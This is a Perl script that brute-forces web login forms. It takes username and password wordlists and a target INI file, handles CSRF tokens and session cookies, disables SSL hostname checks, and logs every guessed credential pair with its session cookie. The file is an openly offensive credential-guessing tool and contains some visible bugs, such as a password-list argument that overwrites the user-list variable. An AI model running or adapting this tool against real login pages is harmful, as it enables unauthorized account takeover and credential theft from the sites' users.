#!/usr/bin/perl -w
use strict;
use utf8;

use Data::Dumper;
use POSIX;
use URI::Escape;
use Config::Simple;


$ENV{'PERL_LWP_SSL_VERIFY_HOSTNAME'} = 0;

BEGIN {
if($0 =~ /^\//)
{
	my $f = $0;
	my $i = 10;
	while(-l $f && $i > 0)
	{
		my $l = readlink $f;
		if(!($l =~ /^\//))
		{
			$l = dirname($f).'/'.$l;
		}
		$f = $l;
		--$i;
	}
	if (!$i)
	{
		print STDERR "too many symbolic links\n";
		exit 1;
	}
	unshift @INC, dirname($f);
}
}

use Auth;

our $cnf_file = "targets.ini";
our $cnf_user = "user.txt";
our $cnf_pass = "pass.txt";
our $cnf_put = undef;

# from config file
our $cnf_dbg              = 0;
our $cnf_login_url        = undef;
our $cnf_login_method     = undef;
our $cnf_login_cred       = undef;
our $cnf_login_regex      = undef;
our $cnf_cookie_name      = undef;
our $cnf_csrf_token_name  = undef;
our $cnf_csrf_token_regex = undef;
our $cnf_csrf_uri         = undef;

sub bf($)
{
	my $fname = shift;
	my $cnt_succ  = 0;
	my $cnt_guess = 0;
	my $cnt_user  = 0;

	my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
	$year += 1900;

	my $fname_out = $fname;
	$fname_out =~ s/\.txt//;
	$fname_out = sprintf("%s_%i-%02i-%02i_%02i%02i%02i.log", $fname_out, $year, $mon, $mday, $hour, $min, $sec);

	#
	# config file
	print "reading config file '$fname', output file '$fname_out'\n";
	my $cfg = new Config::Simple($fname);
	my %cfgh = %{$cfg->param(-block=>'DEFAULT')};
	foreach my $key (keys %cfgh)
	{
		$cnf_dbg              = $cfgh{$key} if($key eq 'dbg');
		$cnf_login_url        = $cfgh{$key} if($key eq 'login_url');
		$cnf_login_method     = $cfgh{$key} if($key eq 'login_method');
		$cnf_login_cred       = $cfgh{$key} if($key eq 'login_cred');
		$cnf_login_regex      = $cfgh{$key} if($key eq 'logout_regex');
		$cnf_cookie_name      = $cfgh{$key} if($key eq 'cookie_name');
		$cnf_csrf_token_name  = $cfgh{$key} if($key eq 'csrf_token_name');
		$cnf_csrf_token_regex = $cfgh{$key} if($key eq 'csrf_token_regex');
		$cnf_csrf_uri         = $cfgh{$key} if($key eq 'csrf_url');

	}
	# verify config
	unless(	defined($cnf_login_url) and
		defined($cnf_login_method) and
		defined($cnf_login_cred))
	{
		die("error: some important config options are missing in '$fname'\n");
	}
	die("auth method '$cnf_login_method' unsupported") unless($cnf_login_method =~/POST/);
	$cnf_csrf_uri = $cnf_login_url unless(defined($cnf_csrf_uri));

	# open log file
	open FDO, "> $fname_out" || die "error: file creating '$fname_out'!\n";
	FDO->autoflush(1);

	#
	# authenticate init
	Auth::init();
	$Auth::cookie_jar->clear;
	$Auth::cookie_jar->clear_temporary_cookies;
	$Auth::csrf_token = undef; # Auth will do it autom. then
	$Auth::csrf_token_name = $cnf_csrf_token_name;
	$Auth::csrf_token_regex = $cnf_csrf_token_regex;
	$Auth::csrf_uri = $cnf_csrf_uri;

	print "login url = $cnf_login_url, method = $cnf_login_method, cred = $cnf_login_cred, regex = $cnf_login_regex\n";

	#
	# guessing
	open(FD_USER, "< $cnf_user") || die("unable to open '$cnf_user'");
	open(FD_PASS, "< $cnf_pass") || die("unable to open '$cnf_pass'");
	while(my $u = <FD_USER>)
	{
		chomp $u;
		$cnt_user++;

		while(my $p = <FD_PASS>)
		{
			chomp $p;

			my $u_esc = uri_escape $u;
			my $p_esc = uri_escape $p;

			my $s = $cnf_login_cred;
			$s =~ s/__USER__/$u_esc/g;
			$s =~ s/__PASS__/$p_esc/g;


			print "$u:$p ($s) # " if $cnf_dbg;
			print "$u:$p # " unless $cnf_dbg;

			# clear old tokens
			my $cookie = undef;
			$Auth::cookie_jar->clear;
			$Auth::cookie_jar->clear_temporary_cookies;
			$Auth::csrf_token= undef;

			# authenticate
			my $time_guess_start = time();
			$cookie = Auth::auth_post($cnf_login_url, $s, $cnf_login_regex);
			my $time_guess_diff = time() - $time_guess_start;
			print "$time_guess_diff secs";
			$cnt_guess++;

			# verify login success XXX verify name and or use res->code regex etc
			unless(defined($cookie))
			{
				print " -> FAILED\n";
				next;
			}
			else
			{
				print "\tSUCCESS\n";
				print FDO "$u:$p ($time_guess_diff secs) -> $cookie\n";
				$cnt_succ++;
				last;
			}
		}
		seek(FD_PASS, 0, 0);
	}
	close FDO;
	close FD_USER;
	close FD_PASS;
	Auth::deinit();

	return ($cnt_user, $cnt_guess, $cnt_succ);
}

#
# MAIN
#
umask(077);

foreach(@ARGV)
{
	$cnf_file = $1 if(/([\w\d\-\_\.\:]+.ini)/);	# just more info
	$cnf_user = $1 if(/user=(.*)/);
	$cnf_user = $1 if(/pass=(.*)/);

	if(/help/i)
	{
		print "usage: [user=userlist.txt] [pass=pwdlist.txt] [target-file.txt]\n\n";
		return;
	}
}

die ("file '$cnf_user' does not exist") unless(-f $cnf_user);
die ("file '$cnf_pass' does not exist") unless(-f $cnf_pass);

my $time_start = time();
my ($u, $g, $s) = bf($cnf_file);
my $time_diff = time() - $time_start;
$time_diff = 1 if($time_diff <= 0);

print "\n\nBenchmark:\n";
printf "\ttotal      time  : %d secs\n", $time_diff;
printf "\tnumber     users : %d\n", $u;
printf "\ttried      logins: %d\n", $g;
printf "\tsuccessful logins: %d\n", $s;
printf "\tsuccess    ratio : %.2f%% guessed\n", ($s/$g)*100;
printf "\ttime       ratio : %.2f [logins/sec]\n\n", $s/$time_diff;
0;

